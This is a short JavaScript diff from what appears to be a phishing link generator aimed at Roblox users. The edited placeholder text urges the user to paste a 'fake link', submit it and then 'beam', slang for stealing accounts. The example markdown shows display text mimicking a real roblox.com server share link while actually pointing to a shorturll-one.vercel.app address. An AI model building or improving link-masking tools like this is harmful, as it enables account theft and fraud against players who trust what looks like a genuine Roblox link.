@@ -5,11 +5,11 @@ function updatePlaceholderAndExample() {
   const input = document.getElementById("urlInput");
 
   if (type === "profile" || type === "privateServer") {
-    input.placeholder = "Type something to add after https://shorturll-one.vercel.app/?";
+    input.placeholder = "Put your fake link here then submit, copy it, it will appear and then you can beam!";
     exampleBlock.innerHTML =
-      '[https*:*//www.roblox.com/share?code=116562041fd4d54681b915675dd54767&type=Server](https://shorturll-one.vercel.app/?)';
+      '[https*:*//www.roblox.com/share?code=116562041fd4d54681b915675dd54767&type=Server](https://shorturll-one.vercel.app/?1)';
   } else if (type === "group") {
-    input.placeholder = "Enter group URL or ID";
+    input.placeholder = "Put your fake link here then submit, copy it, it will appear and then you can beam!";
     exampleBlock.innerHTML = "";
   }
 }
